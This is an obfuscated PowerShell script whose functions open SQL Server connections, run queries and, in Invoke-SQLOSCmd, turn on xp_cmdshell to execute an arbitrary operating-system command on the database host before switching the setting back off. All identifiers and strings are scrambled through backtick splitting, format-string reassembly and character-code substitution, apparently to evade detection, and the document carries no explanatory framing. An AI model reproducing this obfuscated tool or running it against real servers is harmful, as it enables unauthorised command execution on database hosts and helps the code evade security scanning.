 ${a`9m}=[TypE]("{2}{3}{0}{1}"-f 'iRON','mEnT','e','nv') ;  Function g`ET`-co`mputerNA`M`EfROmINSt`AncE
{
    [CmdletBinding()]
    Param(          
        [Parameter(manDAtory = ${fA`L`se},
        HElPmesSaGE = {"{2}{0}{3}{4}{1}"-f' Ser','e.','SQL','ver insta','nc'})]
        [string]${i`NSTA`NcE}
    ) 
    If (${i`NSTAn`cE}){${C`ompute`RNA`me} = ${In`s`TANcE}.("{1}{0}" -f'lit','sp').Invoke('\')[0].("{0}{1}"-f 'spli','t').Invoke(',')[0]}
    else{${C`O`MPu`TeRnamE} = ${EN`V:`c`OmPU`Te`RNAME}}
    Return ${c`OM`Put`erNAME}
}

Function  g`E`T-`sqLCOnneC`TiOnO`BjECT 
{
    [CmdletBinding()]
    Param(
        [Parameter(MAnDATORy = ${fa`lsE},
        hElPmessAge = {"{3}{1}{4}{11}{12}{2}{7}{13}{6}{5}{0}{10}{9}{8}"-f't','Q','ccou','S','L Server or doma','n','the','n','th.','cate wi','i','in ','a','t to au'})]
        [string]${U`Sern`A`Me},

        [Parameter(mANDaTory = ${fA`Lse},
        hElPMeSSAgE = {"{3}{10}{6}{9}{2}{13}{4}{7}{14}{11}{5}{0}{8}{1}{12}" -f 'n',' w','oma','S','acco','he',' Se','unt p','ticate','rver or d','QL','t','ith.','in ','assword to au'})]
        [string]${paS`SWORD},
        
        [Parameter(MaNDAtoRY = ${faL`sE},
        helPMeSsAgE = {"{5}{6}{4}{1}{3}{2}{9}{8}{10}{0}{7}" -f 'o','stance ','o ','t','L Server in','S','Q','n to.','nec','con','ti'})]
        [string]${Ins`TA`NCE},

        [Parameter(mAnDATory = ${fa`L`sE},
        helpMEsSaGE = {"{7}{9}{2}{5}{0}{1}{3}{4}{6}{8}" -f'o','nnect','istra','i','o','tor C','n (DAC','Dedica',').','ted Admin'})]
        [Switch]${D`AC},

        [Parameter(mANDaTorY = ${FA`l`SE},
        hELPmeSsage = {"{3}{1}{6}{5}{0}{8}{7}{2}{4}" -f 'a','lt ','ect to','Defau','.','at','d','se to conn','ba'})]
        [String]${data`B`A`se},

        [Parameter(mAndatoRY = ${fA`lSE},
        hELpMESsage = {"{0}{3}{2}{4}{5}{1}"-f 'Connect','.','n t','io','imeou','t'})]
        [string]${Ti`m`EOUt} = 1
    )
    Begin
    {           
        if(${D`Ac}){${D`ACCO`Nn} = ("{0}{2}{1}"-f 'A',':','DMIN')}else{${DAcc`O`NN} = ''}
        if(-not ${Dat`Aba`sE}){${daT`Aba`sE} = ("{1}{0}" -f'ster','Ma')}
    }
    Process
    {
        if(-not ${Ins`T`AnCE}){${i`N`S`TANCe} = ${e`Nv:`C`o`MPutErNAme}}
        ${CONN`E`ctION} = &("{0}{2}{1}" -f 'New-Ob','ect','j') -TypeName ("{2}{7}{4}{6}{1}{3}{0}{8}{5}"-f'ent.SqlCo','ata.S','Sys','qlCli','em','ion','.D','t','nnect')
        if(${use`Rn`AME} -and ${PA`s`SwOrd}){${co`NNEc`TI`oN}."coNNEC`TIoNS`T`RINg" = ("Server=$DacConn$Instance;Database=$Database;User "+"ID=$Username;Password=$Password;Connection "+"Timeout=$TimeOut")}
        else
        {
            ${U`SEr`DoM`AIn} =   ( &('Ls') ("{1}{0}{2}" -f'Le:','vaRiaB','a9m')  )."va`Lue"::"uSE`R`DoMAi`NNAme"
            ${US`eRN`Ame} =  ${A`9M}::"uS`eR`NAmE"
            ${C`ONN`ECTion`EC`TUSer} = "$UserDomain\$Username"
            ${c`on`NeC`TiOn}."cOnnE`C`Ti`O`NStRiNg" = ("Server=$DacConn$Instance;Database=$Database;Integrated "+'Securi'+'ty='+'SSPI;Connec'+'t'+'ion '+'Tim'+'eout='+'1')                                
        }       
        return ${CoN`Ne`c`TIoN}                     
    }
    End
    {                
    }
}

Function  g`e`T-`SqlQUeRY 
{
    [CmdletBinding()]
    Param(
        [Parameter(MAndAtORy = ${fA`LSE},
        HelpmESSaGe = {"{8}{2}{10}{9}{3}{7}{4}{5}{6}{0}{1}" -f 'ntic','ate with.','r','ain','t',' ','to authe',' accoun','SQL Se','dom','ver or '})]
        [string]${uSE`RN`Ame},

        [Parameter(maNdaTORY = ${FaL`Se},
        HElpMEssAGE = {"{6}{7}{13}{5}{4}{9}{2}{1}{14}{12}{17}{8}{0}{11}{15}{16}{3}{10}" -f' authentica','c','main ac','h','r ','o','S','QL S','word to','do','.','t','pa','erver ','ount ','e',' wit','ss'})]
        [string]${Pa`sswoRd},
        
        [Parameter(manDatORY = ${Fa`lsE},
        HeLPmessaGe = {"{5}{9}{2}{3}{8}{7}{4}{1}{6}{0}"-f 'on to.','nn',' ','i','o','SQL Serv','ecti','to c','nstance ','er'})]
        [string]${I`NstAn`ce},
        
        [Parameter(mANdAtoRY = ${fAl`SE},        
        helPmeSsaGe = {"{2}{1}{5}{0}{3}{4}" -f'r','er q','SQL Serv','y','.','ue'})]
        [string]${Q`Uery},

        [Parameter(MaNdAToRY = ${F`AL`SE},
        HelPmeSsAGe = {"{5}{7}{0}{3}{2}{6}{8}{1}{4}"-f'us','dicated Ad','n','i','min Connection.','C','g D','onnect ','e'})]
        [Switch]${d`AC},

        [Parameter(mANDAtorY = ${fa`LSE},
        HelPMeSsAGE = {"{0}{8}{6}{1}{2}{7}{5}{4}{3}"-f'De','database ','to co','.','to',' ','ault ','nnect','f'})]
        [String]${datAbA`se},

        [Parameter(MAndaTory = ${F`ALSe},
        HeLpMeSSAGE = {"{0}{4}{5}{3}{1}{2}{6}" -f 'Connecti','timeo','u',' ','o','n','t.'})]
        [int]${time`out},

        [Parameter(mANDAtoRy = ${FAL`sE},
        HelpMeSsaGE = {"{3}{2}{1}{5}{0}{4}{6}" -f 'mes','erro','urn ','Ret','s','r ','age if exists.'})]
        [switch]${RETuR`NErr`Or}
    )
    Begin
    {
        ${TBLQ`U`ERYR`eSuLTs} = &("{2}{0}{1}"-f'jec','t','New-Ob') -TypeName ("{1}{2}{0}{3}{4}{5}" -f 'Data.Da','Syste','m.','ta','Tabl','e')
    }
    Process
    {      
        if(${D`Ac}){${con`Nec`TiOn} = &("{4}{0}{5}{1}{2}{3}{6}" -f'et-S','onnection','Ob','j','G','QLC','ect') -Instance ${INs`T`A`NcE} -Username ${Usern`Ame} -Password ${PA`SsWord} -TimeOut ${tiMEO`UT} -DAC -Database ${DA`T`AbasE}}
        else{${coNN`e`CTion} = &("{2}{5}{4}{1}{0}{3}" -f 'O','onnection','Ge','bject','C','t-SQL') -Instance ${I`NSt`ANCE} -Username ${USe`Rna`mE} -Password ${p`A`ssWORd} -TimeOut ${TI`mEO`Ut} -Database ${Data`BASe}}
        ${Co`NNec`T`IOnStRinG} = ${c`O`NNEct`iOn}."ConneCtIO`NS`TRI`NG"
        ${INst`A`Nce} = ${C`ONNE`C`TIo`NStR`ING}.("{0}{1}" -f 'sp','lit').Invoke(';')[0].("{0}{1}"-f 'spl','it').Invoke('=')[1]
        if(${QU`ery})
        {
            ${C`OnN`ecTioN}.("{0}{1}"-f'Ope','n').Invoke()
            ${COMm`And} = &("{0}{1}{2}" -f'N','ew-','Object') -TypeName ("{4}{1}{0}{3}{5}{2}" -f'SqlClient.','.','mmand','Sq','System.Data','lCo') -ArgumentList (${q`UE`Ry}, ${CO`NnEc`TioN})
            try {
                ${ReSU`l`Ts} = ${c`ommA`ND}.("{3}{2}{0}{1}"-f 'a','der','teRe','Execu').Invoke()                                             
                ${tBlqUEryR`esu`L`TS}.("{0}{1}" -f 'Lo','ad').Invoke(${r`esUlTS})  
            } catch {
                
            }                                                                                    
            ${COnn`eC`TIOn}.("{0}{1}"-f'C','lose').Invoke()
            ${cONNE`Cti`ON}.("{2}{0}{1}"-f's','pose','Di').Invoke() 
        }
        else{("{0}{4}{6}{2}{8}{9}{1}{7}{3}{5}"-f'N','t','y provide','t-SQLQuery func','o ','tion.','quer','o Ge','d',' ');Break}
    }
    End
    {   
        if(${R`eTURNer`R`oR}){${ErRO`R`ME`S`SaGe}}
        else{${TBLQ`Ue`RYRe`SU`LtS}}                  
    }
}

Function  i`NVoke-SQ`lOS`cmd
{
    [CmdletBinding()]
    Param(
        [Parameter(mANdAToRY = ${F`ALsE},
        HeLpmeSSAge = {"{8}{5}{2}{6}{7}{4}{0}{1}{3}{9}" -f ' au','thentic',' d','a','t to','QL Server or','omain ','accoun','S','te with.'})]
        [string]${us`ernAME},

        [Parameter(MANdaTorY = ${fA`L`sE},
        helPMESsage = {"{6}{7}{3}{5}{14}{1}{9}{2}{12}{17}{10}{0}{13}{15}{8}{4}{11}{16}"-f'aut','o','nt',' or do',' ','main','SQL Serv','er','cate','u',' ','wi',' passwor','h',' acc','enti','th.','d to'})]
        [string]${Pa`s`SW`ORd},

        [Parameter(MaNdAToRY = ${F`AlsE},
        heLpMEssagE = {"{1}{0}{2}{3}{7}{6}{5}{4}"-f'L S','SQ','er','ve','ion to.','ect',' to conn','r instance'})]
        [string]${InS`T`AnCE},

        [Parameter(mandAtoRY = ${fal`se},
        HElPMeSSage = {"{5}{7}{3}{6}{4}{1}{0}{2}{8}"-f'n Con','mi','necti','ing D','ted Ad','Connec','edica','t us','on.'})]
        [Switch]${d`Ac},

        [Parameter(mAndATORY = ${T`RuE},
        HELpMessAGE = {"{5}{0}{3}{6}{4}{1}{2}"-f ' comma','be',' executed.','nd','o ','OS',' t'})]
        [String]${coM`MA`ND},

        [Parameter(maNDatOry = ${F`AlsE},
        HELpMEssage = {"{0}{4}{3}{2}{5}{1}" -f 'C','ion timeout.','c','nne','o','t'})]
        [string]${tImE`OUt},

        [Parameter(mANdAtory = ${F`AL`sE},
        hElpmeSsAGe = {"{4}{0}{2}{3}{1}"-f'm','s.','ber of thre','ad','Nu'})]
        [int]${THREa`dS} = 1,

        [Parameter(mAnDAToRY = ${F`AL`sE},
        HElPMeSsaGE = {"{3}{15}{13}{8}{1}{12}{11}{5}{2}{14}{6}{7}{4}{10}{0}{9}"-f'ame','s','itho','Just show t','puter','s w',' the',' com','e','.',' or instance n','t','ul','raw r','ut','he '})]
        [switch]${Ra`Wre`SULts}
    )
    Begin
    {
        if(-not ${inS`Ta`NCe}){${inSt`AnCE} = ${E`N`V:Co`MpUTeRna`mE}}
        if(${In`StAnCE}){${pR`ovide`i`NStA`N`ce} = &("{2}{0}{1}"-f'-Objec','t','New') -TypeName ("{1}{0}{2}" -f 'SObje','P','ct') -Property @{("{2}{0}{1}" -f'anc','e','Inst') = ${INS`TA`NcE}}}
    }
    Process
    {
        ${cOmp`Ute`RNaME} = &("{2}{6}{4}{5}{0}{1}{3}" -f'ameFro','mInsta','G','nce','er','N','et-Comput') -Instance ${In`s`Tance}
        if(-not ${Ins`TA`NCE}){${iNstA`NCE} = ${Env:COMpUTe`RN`A`Me}}
        if(${d`Ac}){${co`NNe`cTION} = &("{3}{0}{1}{2}{4}" -f'QLConn','ect','ionObjec','Get-S','t') -Instance ${i`Nst`ANCE} -Username ${u`s`Ern`AmE} -Password ${pa`s`Sw`oRd} -DAC -TimeOut ${TIM`E`OUt}}
        else{${cONN`e`C`TIoN} = &("{4}{3}{1}{0}{2}"-f'j','ionOb','ect','ct','Get-SQLConne') -Instance ${In`S`TaNcE} -Username ${USER`Na`mE} -Password ${pA`SSWo`Rd} -TimeOut ${t`IMEoUT}}

        ${C`o`N`NecTiON}.("{1}{0}" -f'n','Ope').Invoke()
        ("$Instance "+': '+'Conn'+'e'+'ction'+' '+'S'+'ucce'+'ss.')
        ${D`iSAblEsHo`WadVA`NCEDopt`I`O`Ns} = 0
        ${DIsa`BLE`x`PC`MdshelL} = 0
                
        ${q`UerY} = ('S'+'ELECT '+' '+' '+' '+"'$ComputerName' "+'a'+'s '+'[Com'+'puter'+'Na'+'me'+'],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"'$Instance' "+'as'+' '+'[Instan'+'ce'+'],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'CA'+'SE '+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'W'+'HEN '+(('IS_SRVROLEM'+'E'+'M'+'B'+'ER(Na8sysad'+'minNa'+'8) ')  -replAce ([CHAr]78+[CHAr]97+[CHAr]56),[CHAr]39)+'= '+' '+'0 '+'T'+'HEN '+('O'+'NxNoO'+'Nx
 ')."R`EplACe"(([CHAR]79+[CHAR]78+[CHAR]120),[sTRING][CHAR]39)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'E'+'LSE '+('tePYe'+'steP'+'
 ')."REP`LAcE"(([cHaR]116+[cHaR]101+[cHaR]80),[StRINg][cHaR]39)+' '+' '+' '+' '+' '+' '+' '+'END'+' '+'as'+' '+'I'+'sSy'+'sadmin')
        ${tbLsy`s`ADM`i`N`StatuS} = &("{1}{0}{2}" -f 'Que','Get-SQL','ry') -Instance ${i`N`stAnce} -Query ${Q`UERY} -Username ${u`SeRnAMe} -Password ${PaS`S`WorD}

        if(${tBL`SyS`AdM`In`StAtuS}."IS`s`Ysadmin" -eq 'Yes')
        {
            ("$Instance "+': '+'Yo'+'u '+'ar'+'e '+'a '+'sy'+'s'+'a'+'dmin.')
            ${ISx`PC`Md`sh`eLleNaBlED} = &("{0}{2}{3}{1}"-f 'G','uery','et-SQ','LQ') -Instance ${i`N`STaNCe} -Query ((("{2}{0}{4}{3}{7}{6}{5}{1}" -f'YzW','YzW','sp_configure ','s','xp_cmd','l','l','he'))."r`E`PLace"('YzW',[StRiNg][chAr]39)) -Username ${UseR`NA`mE} -Password ${Pa`ss`worD}
            ${isSHOWAd`V`AnCEDe`Na`BL`ED} = &("{3}{1}{0}{2}" -f'u','LQ','ery','Get-SQ') -Instance ${IN`sta`NCE} -Query ((("{6}{1}{2}{3}{0}{5}{7}{4}{8}" -f'dv','n','figure',' xpeShow A','s','anced Op','sp_co','tion','xpe')) -CREPlace ([CHar]120+[CHar]112+[CHar]101),[CHar]39) -Username ${U`SeR`Name} -Password ${PAss`WO`Rd}
        }
        else{("$Instance "+': '+'You'+' '+'are'+' '+'n'+'ot '+'a '+'s'+'y'+'sadmin'+'. '+'Thi'+'s '+'c'+'omm'+'and '+'require'+'s'+' '+'sy'+'s'+'admin '+'p'+'rivi'+'l'+'eges.');return}

        if (${I`s`sho`wad`Van`CeDENABLed}."CoNF`i`G_V`Alue" -eq 1){("$Instance "+': '+'Sh'+'ow '+'A'+'dva'+'nced '+'Opti'+'o'+'ns '+'is'+' '+'alrea'+'dy '+'enab'+'led'+'.')}
        else
        {
            ("$Instance "+': '+'Show'+' '+'A'+'dv'+'anced '+'Optio'+'ns'+' '+'is'+' '+'d'+'is'+'abled.')
            ${DisaBlEshoW`A`dVAnCeD`o`PtIO`NS} = 1
            &("{0}{2}{3}{1}" -f 'G','ery','et-','SQLQu') -Instance ${In`st`ANCe} -Query ((("{10}{1}{7}{9}{5}{8}{11}{2}{0}{3}{4}{6}"-f'ns','nfigure dp','d Optio','dpM,1;RE','CONFIGU','v','RE','MShow','an',' Ad','sp_co','ce'))."R`EPL`ACe"(([ChAR]100+[ChAR]112+[ChAR]77),[String][ChAR]39)) -Username ${uS`ErnAME} -Password ${pass`woRD}
            ${i`sShOWa`dvaNcEd`eN`ABLeD2} = &("{3}{0}{2}{1}" -f't-','Query','SQL','Ge') -Instance ${ins`Ta`N`ce} -Query ((("{6}{8}{11}{5}{9}{1}{0}{10}{4}{2}{7}{3}" -f 'Show Advanc','e {0}','pt','ons{0}','O','u','sp_co','i','n','r','ed ','fig'))-F  [cHAR]39) -Username ${US`Er`NAMe} -Password ${paSs`W`ORd}
            if(${IsS`howa`Dv`AncEd`EnA`Bled2}."cONFig`_`Val`Ue" -eq 1){("$Instance "+': '+'E'+'nab'+'led '+'Sho'+'w '+'Adv'+'anc'+'ed '+'Opt'+'ions'+'.')}
            else{("$Instance "+': '+'Enab'+'l'+'ing '+'Sh'+'ow '+'A'+'d'+'vanced '+'Optio'+'n'+'s '+'f'+'ai'+'led. '+'Ab'+'ortin'+'g.');return}
        }
        if (${i`sXpC`mDsH`ELl`eNa`BLed}."co`NFiG`_`VAlUe" -eq 1){("$Instance "+': '+'xp_'+'cmd'+'shell '+'is'+' '+'alr'+'eady '+'ena'+'bled'+'.')}
        else
        {
            ("$Instance "+': '+'xp'+'_cmdshel'+'l '+'is'+' '+'d'+'i'+'sabled.')
            ${Disa`BLex`PC`mdS`heLL} = 1
            &("{0}{2}{1}"-f 'Ge','SQLQuery','t-') -Instance ${INs`TaNCE} -Query ((("{7}{10}{9}{3}{11}{4}{6}{12}{5}{1}{0}{8}{2}" -f 'CONF','E','GURE',' {0','cm',';R','dsh','sp','I','nfigure','_co','}xp_','ell{0},1')) -f[cHAR]39) -Username ${uS`eRnA`me} -Password ${p`AS`SwORD}
            ${iSXPCm`Ds`HELlE`Na`BLe`D2} = &("{2}{1}{0}" -f'-SQLQuery','et','G') -Instance ${IN`staN`cE} -Query ("{2}{6}{5}{1}{0}{4}{3}"-f 're ','gu','s','ll','xp_cmdshe','fi','p_con') -Username ${u`S`eRNAMe} -Password ${Pass`w`ORD}
            if(${iSXP`Cm`dshELl`e`NAbL`e`d2}."c`oNFi`G_`VALUe" -eq 1){("$Instance "+': '+'Enabl'+'ed'+' '+'x'+'p'+'_cmdshell.')}
            else{("$Instance "+': '+'Enab'+'ling'+' '+'xp_cm'+'ds'+'hell '+'f'+'ailed.'+' '+'Abo'+'rtin'+'g.');return}
        }
        ("$Instance "+': '+'Runnin'+'g '+'comma'+'nd: '+"$Command")
        ${Qu`e`Ry} = ('EX'+'EC '+'ma'+'ster.'+'.'+'xp_'+'cm'+'dsh'+'ell '+"'$Command'")
        ${cmdr`E`SuLts} = &("{3}{0}{1}{2}"-f'QL','Quer','y','Get-S') -Instance ${iNStA`NCe} -Query ${que`Ry} -Username ${us`eRn`A`Me} -Password ${pAs`sw`oRd}
        ""
        ${C`mD`RE`sULTs}."O`U`TPuT"
        if(${Di`s`AblExp`cMDShElL} -eq 1){("$Instance "+': '+'Dis'+'ablin'+'g '+'xp'+'_c'+'mdshell');&("{2}{1}{0}" -f'Query','SQL','Get-') -Instance ${INs`T`AnCE} -Query ((("{4}{5}{0}{3}{1}{2}{6}"-f 'p_cmdshell',',0;R','E','CR7','sp_configure CR7','x','CONFIGURE')) -RePlACe  'CR7',[chAR]39) -Username ${u`SErn`AMe} -Password ${pAsSw`O`Rd}}
        if(${DiSa`Bl`eShOwadvAN`cedO`PTI`onS} -eq 1){("$Instance "+': '+'D'+'isab'+'lin'+'g '+'Sh'+'ow '+'Adv'+'a'+'nce'+'d '+'Opt'+'ions');&("{0}{1}{3}{2}"-f'G','e','uery','t-SQLQ') -Instance ${In`ST`An`ce} -Query ((("{8}{1}{9}{5}{2}{10}{7}{3}{6}{0}{4}" -f';RECON','co','how Adv','io','FIGURE','{0}S','ns{0},0','d Opt','sp_','nfigure ','ance')) -f[CHAr]39) -Username ${u`seRnA`ME} -Password ${PAsS`WoRD}}
        ${ConnE`Ct`IoN}.("{1}{0}" -f'ose','Cl').Invoke()
        ${CO`Nn`ecTi`On}.("{0}{1}" -f 'Dispos','e').Invoke()
    }
    End
    {
    }
}